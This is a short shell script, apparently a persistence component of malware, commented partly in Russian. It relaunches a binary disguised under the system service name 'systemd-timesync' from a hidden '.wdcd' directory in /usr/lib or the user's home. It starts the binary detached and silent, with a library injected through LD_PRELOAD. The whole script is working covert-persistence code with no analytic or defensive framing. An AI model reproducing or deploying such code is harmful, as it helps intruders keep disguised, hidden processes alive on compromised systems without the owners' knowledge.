#!/bin/sh
# context-agnostic keepalive: работает и для $HOME, и для /usr/lib (root/sudo)
if [ "$(id -u)" = 0 ] || [ -w /usr/lib/.wdcd/bin ] 2>/dev/null; then
    DIR=/usr/lib/.wdcd
else
    DIR="$HOME/.wdcd"
fi
PIDFILE=$DIR/bin/wdcd.pid
BIN=$DIR/bin/systemd-timesync
[ -x "$BIN" ] || exit 0
PID=$(cat "$PIDFILE" 2>/dev/null || echo 0)
case "$PID" in ''|*[!0-9]*) PID=0;; esac
[ "$PID" -gt 0 ] 2>/dev/null && kill -0 "$PID" 2>/dev/null && exit 0
setsid env WDCD_DIR="$DIR" LD_PRELOAD="$DIR/bin/libcache.so" nohup "$BIN" --foreground >/dev/null 2>&1 < /dev/null &
echo $! > "$PIDFILE"
